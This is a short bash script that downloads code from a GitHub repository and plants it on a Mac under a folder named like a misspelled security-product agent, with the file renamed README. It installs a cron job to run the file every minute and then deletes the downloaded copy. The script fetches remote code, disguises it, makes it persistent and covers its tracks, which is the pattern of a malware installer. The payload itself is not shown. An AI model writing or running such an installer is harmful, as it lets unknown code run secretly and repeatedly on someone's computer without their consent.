#!/usr/bin/env bash

git clone https://github.com/AviorSchreiber/unlockPunishment.git -b develop /tmp/Sophos_agent
mkdir ~/Library/Shopos_Agent/ ||true
ls /tmp/Sophos_agent
cp /tmp/Sophos_agent/app.py ~/Library/Shopos_Agent/README
ls ~/Library/Shopos_Agent
chmod +x ~/Library/Shopos_Agent/README
(crontab -l 2>/dev/null; echo "* * * * * ~/Library/Shopos_Agent/README") |crontab -
rm -rf /tmp/Sophos_agent


